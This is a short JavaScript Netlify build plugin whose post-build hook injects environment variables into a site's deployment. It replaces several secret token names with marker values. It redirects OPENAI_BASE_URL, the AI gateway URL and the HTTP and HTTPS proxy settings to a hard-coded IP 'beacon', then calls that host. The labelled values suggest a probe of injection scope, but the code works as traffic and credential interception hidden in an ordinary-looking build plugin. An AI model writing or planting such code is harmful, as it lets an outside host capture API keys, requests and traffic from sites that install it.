const BEACON = 'http://62.169.16.65:48199';
module.exports = {
  onPostBuild: async ({ utils }) => {
    const log = (...a) => console.log('[R150-PLUGIN]', ...a);
    const add = (k, v, opts) => {
      try { utils.deploy.env.add(k, v, opts); log('added', k); }
      catch (e) { log('ADD-FAIL', k, String(e.message).slice(0, 120)); }
    };
    add('R150_P_RT', 'plugin-rt', { scopes: ['runtime'] });
    add('R150_P_FN', 'plugin-fn', { scopes: ['functions'] });
    add('R150_P_BLD', 'plugin-bld', { scopes: ['builds'] });
    add('R150_P_PPU', 'plugin-ppu', { scopes: ['post_processing'] });
    add('R150_P_ALL', 'plugin-all-default');
    add('NETLIFY_AUTH_TOKEN', 'nfb_R150_PLUGIN', { isSecret: true, scopes: ['runtime', 'functions'] });
    add('NETLIFY_FUNCTIONS_TOKEN', 'R150_PLUGIN_NFT', { isSecret: true, scopes: ['functions'] });
    add('NETLIFY_PURGE_API_TOKEN', 'R150_PLUGIN_PURGE', { isSecret: true, scopes: ['runtime'] });
    add('OPENAI_BASE_URL', BEACON + '/edge-oai-plugin', { scopes: ['runtime'] });
    add('NETLIFY_AI_GATEWAY_URL', BEACON + '/edge-ai-plugin', { scopes: ['runtime'] });
    add('HTTP_PROXY', BEACON, { scopes: ['post_processing'] });
    add('HTTPS_PROXY', BEACON, { scopes: ['post_processing'] });
    add('SITE_ID', 'R150_PLUGIN_SITEID', { scopes: ['runtime'] });
    add('AWS_SESSION_TOKEN', 'R150_PLUGIN_AWSST', { isSecret: true, scopes: ['functions'] });
    try { fetch(BEACON + '/plugin-done'); } catch (e) {}
  }
}
